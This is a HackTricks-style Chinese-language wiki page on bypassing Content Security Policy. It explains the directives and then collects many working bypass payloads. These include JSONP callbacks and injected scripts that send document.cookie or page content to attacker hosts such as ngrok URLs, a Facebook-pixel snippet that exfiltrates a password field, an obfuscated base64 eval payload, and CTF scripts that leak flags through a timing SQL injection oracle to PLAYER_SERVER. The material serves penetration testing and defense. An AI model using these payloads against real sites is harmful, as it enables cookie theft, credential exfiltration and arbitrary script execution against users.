# 内容安全策略 (CSP) Bypass

{{#include ../../banners/hacktricks-training.md}}

## 什么是 CSP

Content Security Policy (CSP) 被视为一种浏览器技术，主要用于**防护诸如跨站脚本攻击 (XSS) 之类的攻击**。它通过定义和说明浏览器可以从中安全加载资源的路径和来源来发挥作用。这些资源包括图片、frames 和 JavaScript 等多种元素。例如，策略可能允许从同一域 (self) 加载和执行资源，包括 inline 资源，以及通过 `eval`、`setTimeout` 或 `setInterval` 等函数执行字符串代码。

CSP 的实现通过**响应头**或通过将**meta 元素嵌入 HTML 页面**来进行。浏览器会遵循该策略主动强制这些规定，并在检测到违规时立即阻止。

- 通过响应头实现：
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
- 通过 meta 标签实现：
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### 请求头

CSP 可以通过以下请求头来强制或监控：

- `Content-Security-Policy`: 强制执行 CSP；浏览器会阻止任何违规行为。
- `Content-Security-Policy-Report-Only`: 用于监控；报告违规但不阻止。适合在预生产环境中进行测试。

### 定义资源

CSP 限制加载主动和被动内容的来源，控制诸如内联 JavaScript 执行和 `eval()` 的使用等方面。示例策略如下：
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Directives

- **script-src**: 允许特定来源的 JavaScript，包括 URL、内联脚本，以及由事件处理程序或 XSLT 样式表触发的脚本。
- **default-src**: 设置默认策略，用于在缺少特定 fetch 指令时获取资源。
- **child-src**: 指定允许的资源，用于 web workers 和嵌入的 frame 内容。
- **connect-src**: 限制可以通过如 fetch、WebSocket、XMLHttpRequest 等接口加载的 URL。
- **frame-src**: 限制 frames 的 URL。
- **frame-ancestors**: 指定哪些来源可以嵌入当前页面，适用于 `<frame>`、`<iframe>`、`<object>`、`<embed>` 和 `<applet>` 等元素。
- **img-src**: 定义图片允许的来源。
- **font-src**: 指定使用 `@font-face` 加载字体的有效来源。
- **manifest-src**: 定义应用程序清单文件的允许来源。
- **media-src**: 定义加载媒体对象的允许来源。
- **object-src**: 定义 `<object>`、`<embed>` 和 `<applet>` 元素的允许来源。
- **base-uri**: 指定使用 `<base>` 元素加载时允许的 URL。
- **form-action**: 列出表单提交的有效端点。
- **plugin-types**: 限制页面可调用的 MIME 类型。
- **upgrade-insecure-requests**: 指示浏览器将 HTTP URL 重写为 HTTPS。
- **sandbox**: 应用类似于 `<iframe>` 的 sandbox 属性的限制。
- **report-to**: 指定在策略被违反时，报告将发送到的组。
- **worker-src**: 指定 Worker、SharedWorker 或 ServiceWorker 脚本的有效来源。
- **prefetch-src**: 指定将要被抓取或预抓取的资源的有效来源。
- **navigate-to**: 限制文档可通过任何方式导航到的 URL（如 a、form、window.location、window.open 等）。

### Sources

- `*`: 允许所有 URL，除了使用 `data:`, `blob:`, `filesystem:` 方案的。
- `'self'`: 允许从同一域加载。
- `'data'`: 允许通过 data 方案加载资源（例如 Base64 编码的图片）。
- `'none'`: 阻止从任何来源加载。
- `'unsafe-eval'`: 允许使用 `eval()` 和类似方法，出于安全原因不建议使用。
- `'unsafe-hashes'`: 启用特定的内联事件处理程序。
- `'unsafe-inline'`: 允许使用内联资源，如内联 `<script>` 或 `<style>`，出于安全原因不建议使用。
- `'nonce'`: 使用加密 nonce（一次性数字）对白名单中特定内联脚本进行许可。
- If you have JS limited execution it's possible to get a used nonce inside the page with `doc.defaultView.top.document.querySelector("[nonce]")` and then reuse it to load a malicious script (if strict-dynamic is used, any allowed source can load new sources so this isn't needed), like in:

<details>

<summary>重用 nonce 来加载脚本</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
</details>

- `'sha256-<hash>'`: 将具有特定 sha256 哈希的脚本列入白名单。
- `'strict-dynamic'`: 如果脚本已被 nonce 或 hash 列入白名单，则允许从任意来源加载脚本。
- `'host'`: 指定一个特定主机，例如 `example.com`。
- `https:`: 将 URL 限制为使用 HTTPS 的地址。
- `blob:`: 允许从 Blob URL 加载资源（例如通过 JavaScript 创建的 Blob URL）。
- `filesystem:`: 允许从文件系统加载资源。
- `'report-sample'`: 在违规报告中包含违规代码的样本（有助于调试）。
- `'strict-origin'`: 类似于 'self'，但确保资源来源的协议安全级别与文档匹配（仅安全来源可以从安全来源加载资源）。
- `'strict-origin-when-cross-origin'`: 在进行同源请求时发送完整 URL，但在跨源请求时只发送 origin。
- `'unsafe-allow-redirects'`: 允许加载会立即重定向到其他资源的资源。不推荐，因为它会削弱安全性。

## 不安全的 CSP 规则

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
可用的 payload：`"/><script>alert(1);</script>`

#### self + 'unsafe-inline' 通过 Iframes


{{#ref}}
csp-bypass-self-+-unsafe-inline-with-iframes.md
{{#endref}}

### 'unsafe-eval'

> [!CAUTION]
> 这不可行，更多信息请 [**check this**](https://github.com/HackTricks-wiki/hacktricks/issues/653).
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
可用的 payload:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

如果你能以某种方式让 **被允许的 JS 代码在 DOM 中创建了一个新的 script tag**，并且该 tag 包含你的 JS 代码（因为是一个被允许的脚本在创建它），那么 **新的 script tag 将被允许执行**。

### 通配符 (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
有效的 payload:
```html
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### 缺少 object-src 和 default-src

> [!CAUTION] > **看起来这不再起作用了**
```yaml
Content-Security-Policy: script-src 'self' ;
```
有效的 payloads:
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### 文件上传 + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
如果你能上传 JS 文件，你可以 bypass 这个 CSP：

有效的 payload：
```html
"/>'><script src="/uploads/picture.png.js"></script>
```
然而，很有可能服务器正在**验证上传的文件**，并且只允许你**上传特定类型的文件**。

此外，即便你可以使用服务器接受的扩展名在文件中上传 **JS code inside**（例如：_script.png_），这仍然不够，因为有些服务器（如 apache server）会**根据扩展名选择文件的 MIME type**，而像 Chrome 这样的浏览器会**拒绝在本应为图片的文件中执行 Javascript** 代码。“幸运的是”，有时会有失误。例如，在一次 CTF 中我了解到 **Apache doesn't know** _**.wave**_ 扩展，因此它不会以 **MIME type like audio/*** 的方式来提供该文件。

因此，如果你发现一个 XSS 和一个文件上传，并且设法找到一个**被误判的扩展名**，你可以尝试上传一个带有该扩展名且包含脚本内容的文件。或者，如果服务器在检查上传文件的正确格式，可以创建一个 polyglot（[some polyglot examples here](https://github.com/Polydet/polyglot-database)）。

### Form-action

如果无法注入 JS，你仍然可以尝试通过例如注入表单 action 来外泄凭证（并可能寄希望于密码管理器自动填充）。你可以在这份[**报告示例**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp)中找到一个例子。此外，注意 `default-src` 并不覆盖 form actions。

### Third Party Endpoints + ('unsafe-eval')

> [!WARNING]
> 对于下面的一些 payload，**`unsafe-eval` 甚至不是必需的**。
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
加载一个存在漏洞的 angular 版本并执行任意 JS：
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloads — 使用 Angular 加上一个其 functions 会返回 `window` 对象的 library（[check out this post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)）:

> [!TIP]
> 该文章显示你可以 **load** 所有 **libraries** 自 `cdn.cloudflare.com`（或其他任何被允许的 JS libraries repo），对每个 library 执行所有添加的 functions，并检查 **哪些 functions 来自哪些 libraries 会返回 `window` 对象**。
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
来自类名的 Angular XSS:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
#### Abusing google recaptcha JS code

根据 [**this CTF writeup**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=es&_x_tr_pto=wapp#noteninja-3-solves)，你可以在 CSP 内滥用 [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) 来执行任意 JS 代码，从而绕过 CSP：
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
更多 [**payloads from this writeup**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):
```html
<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>

<!-- Trigger alert -->
<img src="x" ng-on-error="$event.target.ownerDocument.defaultView.alert(1)" />

<!-- Reuse nonce -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
#### 滥用 www.google.com 进行 open redirect

下面的 URL 会重定向到 example.com（来自 [here](https://www.landh.tech/blog/20240304-google-hack-50000/)):
```
https://www.google.com/amp/s/example.com/
```
滥用 \*.google.com/script.google.com

可以滥用 Google Apps Script 在 script.google.com 内的页面接收信息。就像在这篇[报告](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/)中所做的那样。

### 第三方端点 + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
像这种场景，当 `script-src` 被设置为 `self` 且某个特定域被列入白名单时，可以通过 JSONP 绕过。JSONP endpoints 允许不安全的 callback 方法，从而使攻击者执行 XSS。可用的 payload：
```html
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```

```html
<script type="text/javascript" crossorigin="anonymous" src="https://accounts.google.com/o/oauth2/revoke?callback=eval(atob(%27KGZ1bmN0aW9uKCl7CiBsZXQgdnIgPSAoKT0%2Be3dpdGgobmV3IHRvcFsnVydbJ2NvbmNhdCddKCdlYicsJ1MnLCdjZycmJidvY2snfHwncGsnLCdldCcpXSgndydbJ2NvbmNhdCddKCdzcycsJzpkZWZkZWYnLCdsaScsJ3ZlY2hhdGknLCduYycsJy4nfHwnOycsJ25ldHdvcmtkZWZjaGF0cGlwZWRlZjAyOWRlZicpWydzcGxpdCddKCdkZWYnKVsnam9pbiddKCIvIikpKShvbm1lc3NhZ2U9KGUpPT5uZXcgRnVuY3Rpb24oYXRvYihlWydkYXRhJ10pKS5jYWxsKGVbJ3RhcmdldCddKSl9O25hdmlnYXRvclsnd2ViZHJpdmVyJ118fChsb2NhdGlvblsnaHJlZiddWydtYXRjaCddKCdjaGVja291dCcpJiZ2cigpKTsKfSkoKQ%3D%3D%27));"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **包含可直接使用的 JSONP endpoints，用于对不同网站进行 CSP bypass。**

如果 **受信任的 endpoint 包含 Open Redirect**，也会出现相同的漏洞，因为如果初始端点被信任，重定向也会被信任。

### 第三方滥用

如在 [following post](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses) 中所述，存在许多第三方域名可能在 CSP 的某处被允许，可能被滥用来 exfiltrate 数据或执行 JavaScript 代码。以下是其中一些第三方：

| 实体               | 被允许的域名                                 | 能力         |
| ----------------- | -------------------------------------------- | ------------ |
| Facebook          | www.facebook.com, \*.facebook.com            | Exfil        |
| Hotjar            | \*.hotjar.com, ask.hotjar.io                 | Exfil        |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net            | Exec         |
| Amazon CloudFront | \*.cloudfront.net                            | Exfil, Exec  |
| Amazon AWS        | \*.amazonaws.com                             | Exfil, Exec  |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | Exfil, Exec  |
| Salesforce Heroku | \*.herokuapp.com                             | Exfil, Exec  |
| Google Firebase   | \*.firebaseapp.com                           | Exfil, Exec  |

如果你在目标的 CSP 中发现这些被允许的域名之一，很可能可以通过在该第三方服务注册来 bypass CSP，进而将数据 exfiltrate 到该服务或执行代码。

例如，如果你发现以下 CSP：
```
Content-Security-Policy​: default-src 'self’ www.facebook.com;​
```
或
```
Content-Security-Policy​: connect-src www.facebook.com;​
```
你应该能够 exfiltrate data，类似于一直以来通过 [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/) 所采用的方法。在本例中，遵循以下通用步骤：

1. 在此创建一个 Facebook Developer 帐户。
2. 创建一个新的 "Facebook Login" 应用并选择 "Website"。
3. 转到 "Settings -> Basic" 并获取你的 "App ID"。
4. 在你想从中 exfiltrate data 的目标站点上，你可以直接使用 Facebook SDK 的工具 "fbq" 通过一个 "customEvent" 和数据负载来 exfiltrate 数据。
5. 进入你的应用的 "Event Manager" 并选择你创建的应用（注意 event manager 的 URL 可能类似于：https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events）。
6. 选择标签 "Test Events" 以查看由“你”的 web site 发送的事件。

然后，在受害者端，你执行以下代码以初始化 Facebook tracking pixel，使其指向攻击者的 Facebook developer 帐户 app-id 并发出如下的 custom event：
```JavaScript
fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
```
对于前表中列出的其余七个第三方域名，还有许多其他可滥用的方法。有关其他第三方滥用的更多说明，请参考之前的 [blog post](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses)。

### 通过 RPO (Relative Path Overwrite) 绕过 <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

除了上述用于绕过路径限制的重定向之外，还有一种可在某些服务器上使用的技术，称为 Relative Path Overwrite (RPO)。

例如，如果 CSP 允许路径 `https://example.com/scripts/react/`，则可以按如下方式绕过：
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
浏览器最终会加载 `https://example.com/scripts/angular/angular.js`。

之所以可行，是因为对于浏览器来说，你正在从 `https://example.com/scripts/react/` 下加载名为 `..%2fangular%2fangular.js` 的文件，而这符合 CSP。

随后，它会对其解码，实际请求 `https://example.com/scripts/react/../angular/angular.js`，这等同于 `https://example.com/scripts/angular/angular.js`。

通过**利用浏览器与服务器在 URL 解释上的不一致，可以绕过路径规则**。

解决办法是在服务器端不要将 `%2f` 作为 `/` 处理，确保浏览器和服务器之间的解释一致以避免此问题。

Online Example:[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Iframes JS 执行


{{#ref}}
../xss-cross-site-scripting/iframes-in-xss-and-csp.md
{{#endref}}

### 缺失 **base-uri**

如果缺失 **base-uri** 指令，你可以滥用它来执行 [**dangling markup injection**](../dangling-markup-html-scriptless-injection/index.html)。

此外，如果**页面正在使用相对路径加载脚本**（像 `<script src="/js/app.js">`）并使用 **Nonce**，你可以滥用 **base** **tag** 使其 **加载** 该脚本从 **你自己的服务器，从而实现 XSS.**\
如果易受攻击的页面是通过 **httpS** 加载的，请在 base 中使用一个 httpS url。
```html
<base href="https://www.attacker.com/" />
```
### AngularJS 事件

一个称为 Content Security Policy (CSP) 的特定策略可能会限制 JavaScript 事件。不过，AngularJS 提供了自定义事件作为替代。在事件中，AngularJS 暴露了一个特殊对象 `$event`，它引用了原生浏览器事件对象。这个 `$event` 对象可以被利用来绕过 CSP。值得注意的是，在 Chrome 中，`$event/event` 对象具有一个 `path` 属性，包含一个对象数组，该数组涉及事件的执行链，且 `window` 对象总是位于数组末端。这个结构对 sandbox escape 策略至关重要。

通过将该数组传入 `orderBy` filter，可以对其进行迭代，利用最后的元素（即 `window` 对象）来触发全局函数，例如 `alert()`。下面的示例代码说明了这一过程：
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
该片段强调使用 `ng-focus` 指令来触发事件，使用 `$event.path|orderBy` 来操纵 `path` 数组，并利用 `window` 对象执行 `alert()` 函数，从而暴露 `document.cookie`。

**在** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) **中查找其他 Angular 绕过**

### AngularJS 与白名单域名
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
在 Angular JS 应用中，用于脚本加载域的 CSP 策略（白名单）可以通过调用回调函数和某些存在漏洞的类来绕过。关于该技术的更多信息，请参见该 [git repository](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22) 上的详细指南。

Working payloads:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
其他 JSONP 任意执行端点可在 [**here**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) 找到（其中一些已被删除或修复）

### 通过重定向绕过

当 CSP 遇到服务器端重定向时会发生什么？如果重定向指向一个不被允许的不同源，仍然会失败。

然而，根据 [CSP spec 4.2.2.3. Paths and Redirects](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects) 中的描述，如果重定向指向不同的路径，则可以绕过原有的限制。

下面是一个示例：
```html
<!DOCTYPE html>
<html>
<head>
<meta
http-equiv="Content-Security-Policy"
content="script-src http://localhost:5555 https://www.google.com/a/b/c/d" />
</head>
<body>
<div id="userContent">
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
If CSP is set to `https://www.google.com/a/b/c/d`, since the path is considered, both `/test` and `/a/test` scripts will be blocked by CSP.

However, the final `http://localhost:5555/301` will be **redirected on the server-side to `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. Since it is a redirection, the **path is not considered**, and the **script can be loaded**, thus bypassing the path restriction.

With this redirection, even if the path is specified completely, it will still be bypassed.

Therefore, the best solution is to ensure that the website does not have any open redirect vulnerabilities and that there are no domains that can be exploited in the CSP rules.

### Bypass CSP with dangling markup

Read [how here](../dangling-markup-html-scriptless-injection/index.html).

### 'unsafe-inline'; img-src \*; via XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` 意味着你可以在代码中执行任意脚本（XSS 可以执行代码），而 `img-src *` 意味着你可以在网页中使用来自任意资源的任意图片。

你可以通过图片将数据外泄来绕过这个 CSP（在本例中，XSS 利用一个 CSRF：一个 bot 可访问的页面包含一个 SQLi，并通过图片提取 flag）：
```javascript
<script>
fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new
Image().src='http://PLAYER_SERVER/?'+_)
</script>
```
来源: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

你也可以滥用此配置以**加载插入在图片内的 javascript 代码**。例如，如果页面允许从 Twitter 加载图片。你可以**制作**一个**特殊图片**，将其**上传**到 Twitter 并滥用“**unsafe-inline**”来**执行**一个 JS 代码（像常规的 XSS），该代码会**加载**该**图片**，**提取**其中的 **JS** 并**执行**它： [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### With Service Workers

Service workers 的 **`importScripts`** 函数不受 CSP 限制：

{{#ref}}
../xss-cross-site-scripting/abusing-service-workers.md
{{#endref}}

### Policy Injection

**Research:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

如果你发送的一个**参数**被**粘贴到**策略的**声明**中，那么你可以以某种方式**更改**该**策略**使其**失效**。你可以通过下面任一绕过方法**允许 script 'unsafe-inline'**：
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
因为这个指令会 **overwrite existing script-src directives**。\
You can find an example here: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

在 Edge 中更简单。如果你能在 CSP 中添加这个： **`;_`** **Edge** 会 **drop** 整个 **policy**。\
Example: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](<http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&y=%3Cscript%3Ealert(1)%3C/script%3E>)

### img-src \*; via XSS (iframe) - 时序攻击

Notice the lack of the directive `'unsafe-inline'`\
This time you can make the victim **load** a page in **your control** via **XSS** with a `<iframe`. This time you are going to make the victim access the page from where you want to extract information (**CSRF**). You cannot access the content of the page, but if somehow you can **control the time the page needs to load** you can extract the information you need.

This time a **flag** is going to be extracted, whenever a **char 被正确猜出** via SQLi the **响应** takes **更多时间** due to the sleep function. Then, you will be able to extract the flag:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name="f" id="g"></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org"
function gen(x) {
x = escape(x.replace(/_/g, "\\_"))
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`
}

function gen2(x) {
x = escape(x)
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`
}

async function query(word, end = false) {
let h = performance.now()
f.location = end ? gen2(word) : gen(word)
await new Promise((r) => {
g.onload = r
})
let diff = performance.now() - h
return diff > 300
}

let alphabet = "_abcdefghijklmnopqrstuvwxyz0123456789".split("")
let postfix = "}"

async function run() {
let prefix = "nn9ed{"
while (true) {
let i = 0
for (i; i < alphabet.length; i++) {
let c = alphabet[i]
let t = await query(prefix + c) // Check what chars returns TRUE or FALSE
console.log(prefix, c, t)
if (t) {
console.log("FOUND!")
prefix += c
break
}
}
if (i == alphabet.length) {
console.log("missing chars")
break
}
let t = await query(prefix + "}", true)
if (t) {
prefix += "}"
break
}
}
new Image().src = "http://PLAYER_SERVER/?" + prefix //Exfiltrate the flag
console.log(prefix)
}

run()
</script>
```
### 通过 Bookmarklets

这种攻击通常涉及社交工程，攻击者会**说服用户将链接拖放到浏览器的 bookmarklet 上**。该 bookmarklet 会包含**malicious javascript**代码，当被 drag\&dropped 或点击时，会在当前网页窗口的上下文中执行，**bypassing CSP 并允许窃取敏感信息**，例如 cookies 或 tokens。

For more information [**check the original report here**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### 通过限制 CSP 绕过 CSP

In [**this CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), CSP is bypassed by injecting inside an allowed iframe a more restrictive CSP that disallowed to load a specific JS file that, then, via **prototype pollution** or **dom clobbering** allowed to **abuse a different script to load an arbitrary script**.

你可以使用 **`csp`** 属性来 **限制 Iframe 的 CSP**：
```html
<iframe
src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]"
csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
In [**this CTF writeup**](https://github.com/aszx87410/ctf-writeups/issues/48), it was possible via **HTML injection** to **restrict** more a **CSP** so a script preventing CSTI was disabled and therefore the **vulnerability became exploitable.**\
在 [**this CTF writeup**](https://github.com/aszx87410/ctf-writeups/issues/48), 通过 **HTML injection** 可以进一步收紧 **CSP**，从而导致用于防止 CSTI 的脚本被禁用，因此该 **漏洞变得可被利用。**\
CSP can be made more restrictive using **HTML meta tags** and inline scripts can disabled **removing** the **entry** allowing their **nonce** and **enable specific inline script via sha**:  
CSP 可以通过 **HTML meta tags** 变得更严格，inline scripts 可以通过**移除**允许其 **nonce** 的 **entry** 来被禁用，并通过 **sha** 启用特定的 inline script：
```html
<meta
http-equiv="Content-Security-Policy"
content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';" />
```
### JS exfiltration 使用 Content-Security-Policy-Report-Only

如果你能让服务器返回头部 **`Content-Security-Policy-Report-Only`** 且该头的 **由你控制的值**（可能是因为 CRLF），你可以让它指向你的服务器；如果你用 **`<script>`** 包裹你想 exfiltrate 的 **JS content**，并且由于 CSP 很可能不允许 `unsafe-inline`，这会 **触发 CSP 错误**，脚本的一部分（包含敏感信息）将通过 `Content-Security-Policy-Report-Only` 发送到服务器。

For an example [**check this CTF writeup**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector("DIV").innerHTML =
'<iframe src=\'javascript:var s = document.createElement("script");s.src = "https://pastebin.com/raw/dw5cWGK6";document.body.appendChild(s);\'></iframe>'
```
### Leaking Information with CSP and Iframe

- 创建了一个指向某个 URL 的 `iframe`（比如称为 `https://example.redirect.com`），该 URL 被 CSP 允许。
- 该 URL 随后重定向到一个秘密 URL（例如 `https://usersecret.example2.com`），该 URL 被 CSP **不允许**。
- 通过监听 `securitypolicyviolation` 事件，可以捕获 `blockedURI` 属性。该属性会暴露被阻止的 URI 的域名，leaking 出初始 URL 所重定向到的秘密域名。

值得注意的是，像 Chrome 和 Firefox 这样的浏览器在处理与 CSP 相关的 `iframe` 时行为不同，这种未定义行为可能导致敏感信息的 leakage。

